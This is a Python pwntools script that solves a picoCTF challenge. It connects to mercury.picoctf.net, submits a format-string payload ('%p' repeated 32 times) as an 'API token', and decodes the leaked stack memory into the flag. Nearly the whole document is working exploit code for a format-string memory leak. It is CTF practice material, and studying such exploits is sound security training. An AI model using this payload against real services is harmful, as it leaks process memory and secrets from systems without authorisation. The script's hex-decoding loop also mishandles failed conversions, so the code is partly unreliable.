from pwn import *
import struct

host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 27912)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    return remote(argv, *a, **kw)

io = start()
io.sendlineafter('2) View my portfolio\n', "1")
io.sendlineafter('What is your API token?\n', '%p'*32)
io.recvline()
output = io.recvline()
hex_bytes = str(output)[4:].split("0x")
flag_start_index = hex_bytes.index("6f636970")
str_output = ""
for x in hex_bytes[flag_start_index:]:
    try:
        little_hex = bytearray.fromhex(x)
    except ValueError:
        pass
    little_hex.reverse()
    str_output += "".join([chr(i) if ord("0") <= i <= ord("}") else "" for i in little_hex])
flag = str_output.split("}")[0] + "}"
print("Flag: %s" % flag)
